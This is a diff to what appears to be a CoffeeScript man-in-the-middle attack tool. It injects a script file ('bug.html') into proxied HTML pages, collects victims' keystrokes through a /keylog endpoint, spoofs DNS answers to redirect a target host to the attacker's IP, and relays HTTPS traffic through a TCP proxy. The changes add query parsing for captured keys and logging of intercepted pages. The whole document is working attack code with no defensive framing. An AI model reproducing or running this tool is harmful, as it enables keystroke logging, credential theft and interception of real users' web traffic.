@@ -3,6 +3,7 @@ httpProxy = require 'http-proxy'
 fs = require 'fs'
 dns = require 'native-dns'
 net = require 'net'
+qs = require 'querystring'
 
 bug = fs.readFileSync 'bug.html'
 
@@ -21,17 +22,24 @@ for param, desc of ENV_VARS
   if not process.env[param]
     console.log "The environment variable #{param} (#{desc}) must be set."
     process.exit()
+  else
+    console.log "#{param} = #{process.env[param]}"
 
 server = httpProxy.createServer (req, res, proxy) ->
   if /^\/keylog/.exec(req.url)
-    key = /key=(.)/.exec(req.url)?[1]
+    qstring = /\?(.*)/.exec(req.url)?[1]
+    {key} = qs.parse(qstring)
+    key = key.replace '\r', '\n'
+    key = key.replace '\t', '\n'
     process.stdout.write key
     res.writeHead(200)
     res.end('ok')
+    return
 
   res.oldWriteHead = res.writeHead
   res.writeHead = (code, headers) ->
     if /text\/html/.exec(headers['content-type'])
+      console.log "Injecting page #{req.headers['host']}#{req.url}"
       delete headers['content-length']
 
       data = ''
@@ -48,14 +56,20 @@ server = httpProxy.createServer (req, res, proxy) ->
     res.oldWriteHead code, headers
 
   req.headers['accept-encoding'] = 'plain'
-  proxy.proxyRequest req, res,
-    host: req.headers['host']
-    port: HTTP_PORT
+  if req.headers['host']?
+    proxy.proxyRequest req, res,
+      host: req.headers['host']
+      port: HTTP_PORT
+  else
+    res.end()
 
-server.listen HTTP_PORT
+server.listen HTTP_PORT, ->
+  console.log "HTTP Proxy listening on port #{HTTP_PORT}"
 
-handleRequest = (req, res) ->
+dnsServer = dns.createServer()
+dnsServer.on 'request', (req, res) ->
   if req.question[0].name == process.env.TAP_HOST
+    console.log "Intercepting DNS request for #{process.env.TAP_HOST}"
     res.answer.push dns.A
       name: req.question[0].name
       address: process.env.PUBLIC_IP
@@ -74,8 +88,6 @@ handleRequest = (req, res) ->
       res.send()
     newReq.send()
 
-dnsServer = dns.createServer()
-dnsServer.on 'request', handleRequest
 dnsServer.serve DNS_PORT
 
 # source: https://github.com/gonzalo123/nodejs.tcp.proxy/blob/master/proxy.js
@@ -90,5 +102,6 @@ tcpProxy = net.createServer (socket) ->
   upstream.on 'data', (data) ->
     socket.write data
 
-tcpProxy.listen HTTPS_PORT
+tcpProxy.listen HTTPS_PORT, ->
+  console.log "TCP Proxy listening on port #{HTTPS_PORT}"
 
